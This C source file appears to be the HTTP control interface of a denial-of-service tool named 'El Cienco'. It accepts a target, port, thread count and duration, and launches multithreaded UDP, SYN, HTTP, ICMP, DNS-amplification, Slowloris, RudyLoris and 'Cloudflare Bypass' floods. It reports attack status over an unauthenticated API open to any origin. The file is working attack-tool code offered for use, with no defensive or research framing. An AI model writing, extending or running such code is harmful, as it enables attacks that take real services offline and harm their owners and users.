#include "../include/elcienco.h"
#include "../include/api.h"
#include "routes.h"

// External variables
extern volatile int attack_running;
extern pthread_t attack_threads[MAX_THREADS];
extern AttackConfig current_attack;
extern time_t attack_start_time;

// Forward declarations
static void handle_api_request(int client_fd);
static void parse_json_command(const char *json, AttackConfig *config);
static void send_response(int client_fd, int status_code, const char *content_type, const char *body);

void *api_server(void *arg) {
    int port = *((int *)arg);
    int server_fd, client_fd;
    struct sockaddr_in address;
    int opt = 1;
    socklen_t addrlen = sizeof(address);
    
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("[API] Socket creation failed");
        return NULL;
    }
    
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(port);
    
    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        perror("[API] Bind failed");
        close(server_fd);
        return NULL;
    }
    
    if (listen(server_fd, 10) < 0) {
        perror("[API] Listen failed");
        close(server_fd);
        return NULL;
    }
    
    printf("[API] El Cienco Control Interface listening on port %d\n", port);
    printf("[API] Dashboard: http://localhost:%d\n", port);
    
    while (1) {
        client_fd = accept(server_fd, (struct sockaddr *)&address, &addrlen);
        if (client_fd >= 0) {
            handle_api_request(client_fd);
            close(client_fd);
        }
    }
    
    close(server_fd);
    return NULL;
}

static void send_response(int client_fd, int status_code, const char *content_type, const char *body) {
    char response[API_BUFFER_SIZE];
    const char *status_text;
    
    switch (status_code) {
        case 200: status_text = "OK"; break;
        case 400: status_text = "Bad Request"; break;
        case 404: status_text = "Not Found"; break;
        case 405: status_text = "Method Not Allowed"; break;
        case 500: status_text = "Internal Server Error"; break;
        default: status_text = "Unknown"; break;
    }
    
    int len = snprintf(response, sizeof(response),
        "HTTP/1.1 %d %s\r\n"
        "Content-Type: %s\r\n"
        "Content-Length: %zu\r\n"
        "Access-Control-Allow-Origin: *\r\n"
        "Access-Control-Allow-Methods: GET, POST, OPTIONS\r\n"
        "Access-Control-Allow-Headers: Content-Type\r\n"
        "Connection: close\r\n"
        "\r\n"
        "%s",
        status_code, status_text, content_type, strlen(body), body
    );
    
    send(client_fd, response, len, 0);
}

static void handle_api_request(int client_fd) {
    char buffer[API_BUFFER_SIZE] = {0};
    char method[16] = {0};
    char path[256] = {0};
    char version[16] = {0};
    
    ssize_t bytes = recv(client_fd, buffer, sizeof(buffer) - 1, 0);
    if (bytes <= 0) return;
    buffer[bytes] = '\0';
    
    // Parse request line
    sscanf(buffer, "%15s %255s %15s", method, path, version);
    
    printf("[API] %s %s\n", method, path);
    
    // Handle CORS preflight
    if (strcmp(method, "OPTIONS") == 0) {
        send_response(client_fd, 200, "text/plain", "");
        return;
    }
    
    // Find body for POST requests
    char *body = NULL;
    char *body_start = strstr(buffer, "\r\n\r\n");
    if (body_start) {
        body = body_start + 4;
    }
    
    // ============================================
    // ROUTING
    // ============================================
    
    if (strcmp(path, "/status") == 0 && strcmp(method, "GET") == 0) {
        char json[512];
        int active = attack_running ? 1 : 0;
        int thread_count = 0;
        for (int i = 0; i < MAX_THREADS; i++) {
            if (attack_threads[i]) thread_count++;
        }
        
        snprintf(json, sizeof(json),
            "{"
            "\"running\":%d,"
            "\"active_threads\":%d,"
            "\"target\":\"%s\","
            "\"port\":%d,"
            "\"method\":%d,"
            "\"elapsed\":%ld,"
            "\"duration\":%d"
            "}",
            active, thread_count,
            current_attack.target, current_attack.port,
            current_attack.method,
            attack_running ? (time(NULL) - attack_start_time) : 0,
            current_attack.duration
        );
        send_response(client_fd, 200, "application/json", json);
    }
    else if (strcmp(path, "/methods") == 0 && strcmp(method, "GET") == 0) {
        const char *json = 
            "{"
            "\"methods\":["
            "{\"id\":0,\"name\":\"UDP Flood\",\"layer\":\"L4\"},"
            "{\"id\":1,\"name\":\"TCP SYN Flood\",\"layer\":\"L4\"},"
            "{\"id\":2,\"name\":\"HTTP Flood\",\"layer\":\"L7\"},"
            "{\"id\":3,\"name\":\"Slowloris\",\"layer\":\"L7\"},"
            "{\"id\":4,\"name\":\"DNS Amplification\",\"layer\":\"L4\"},"
            "{\"id\":5,\"name\":\"ICMP Flood\",\"layer\":\"L3\"},"
            "{\"id\":6,\"name\":\"RudyLoris\",\"layer\":\"L7\"},"
            "{\"id\":7,\"name\":\"Cloudflare Bypass\",\"layer\":\"L7\"}"
            "]"
            "}";
        send_response(client_fd, 200, "application/json", json);
    }
    else if (strcmp(path, "/attack") == 0 && strcmp(method, "POST") == 0) {
        if (attack_running) {
            send_response(client_fd, 400, "application/json", 
                "{\"error\":\"ATTACK_IN_PROGRESS\",\"message\":\"Stop current attack first\"}");
            return;
        }
        
        AttackConfig config = {0};
        config.threads = 100;
        config.duration = 60;
        config.method = 7;
        
        if (body) {
            parse_json_command(body, &config);
        }
        
        if (strlen(config.target) == 0 || config.port == 0) {
            send_response(client_fd, 400, "application/json",
                "{\"error\":\"INVALID_CONFIG\",\"message\":\"Target and port required\"}");
            return;
        }
        
        if (config.threads > MAX_THREADS) config.threads = MAX_THREADS;
        if (config.duration > 3600) config.duration = 3600;
        
        memcpy(&current_attack, &config, sizeof(AttackConfig));
        attack_running = 1;
        attack_start_time = time(NULL);
        
        // Launch attack threads
        for (int i = 0; i < config.threads; i++) {
            ThreadData *data = malloc(sizeof(ThreadData));
            data->config = config;
            data->thread_num = i;
            data->running = &attack_running;
            
            switch(config.method) {
                case 0: pthread_create(&attack_threads[i], NULL, udp_flood, data); break;
                case 1: pthread_create(&attack_threads[i], NULL, tcp_syn_flood, data); break;
                case 2: pthread_create(&attack_threads[i], NULL, http_flood, data); break;
                case 3: pthread_create(&attack_threads[i], NULL, slowloris_attack, data); break;
                case 4: pthread_create(&attack_threads[i], NULL, dns_amplification, data); break;
                case 5: pthread_create(&attack_threads[i], NULL, icmp_flood, data); break;
                case 6: pthread_create(&attack_threads[i], NULL, rudyloris_attack, data); break;
                case 7: pthread_create(&attack_threads[i], NULL, cloudflare_bypass, data); break;
                default: free(data); break;
            }
        }
        
        char json[512];
        snprintf(json, sizeof(json),
            "{\"status\":\"ATTACK_INITIATED\",\"target\":\"%s\",\"port\":%d,\"threads\":%d,\"method\":%d}",
            config.target, config.port, config.threads, config.method);
        send_response(client_fd, 200, "application/json", json);
        
        printf("[API] Attack launched: %s:%d (method %d, %d threads)\n",
               config.target, config.port, config.method, config.threads);
    }
    else if (strcmp(path, "/stop") == 0 && strcmp(method, "POST") == 0) {
        attack_running = 0;
        
        // Wait for threads
        for (int i = 0; i < MAX_THREADS; i++) {
            if (attack_threads[i]) {
                pthread_join(attack_threads[i], NULL);
                attack_threads[i] = 0;
            }
        }
        
        send_response(client_fd, 200, "application/json", "{\"status\":\"ATTACK_STOPPED\"}");
        printf("[API] Attack stopped\n");
    }
    else {
        send_response(client_fd, 404, "application/json", "{\"error\":\"NOT_FOUND\"}");
    }
}

static void parse_json_command(const char *json, AttackConfig *config) {
    // Target
    char *p = strstr(json, "\"target\"");
    if (p) {
        p = strchr(p, ':');
        if (p) {
            while (*p && (*p == ':' || *p == ' ' || *p == '"')) p++;
            int i = 0;
            while (*p && *p != '"' && *p != ',' && i < 255) {
                config->target[i++] = *p++;
            }
            config->target[i] = '\0';
        }
    }
    
    // Port
    p = strstr(json, "\"port\"");
    if (p) {
        p = strchr(p, ':');
        if (p) config->port = atoi(p + 1);
    }
    
    // Threads
    p = strstr(json, "\"threads\"");
    if (p) {
        p = strchr(p, ':');
        if (p) {
            config->threads = atoi(p + 1);
            if (config->threads < 1) config->threads = 1;
            if (config->threads > MAX_THREADS) config->threads = MAX_THREADS;
        }
    }
    
    // Duration
    p = strstr(json, "\"duration\"");
    if (p) {
        p = strchr(p, ':');
        if (p) {
            config->duration = atoi(p + 1);
            if (config->duration < 1) config->duration = 1;
            if (config->duration > 3600) config->duration = 3600;
        }
    }
    
    // Method
    p = strstr(json, "\"method\"");
    if (p) {
        p = strchr(p, ':');
        if (p) {
            config->method = atoi(p + 1);
            if (config->method < 0 || config->method > 7) config->method = 7;
        }
    }
}
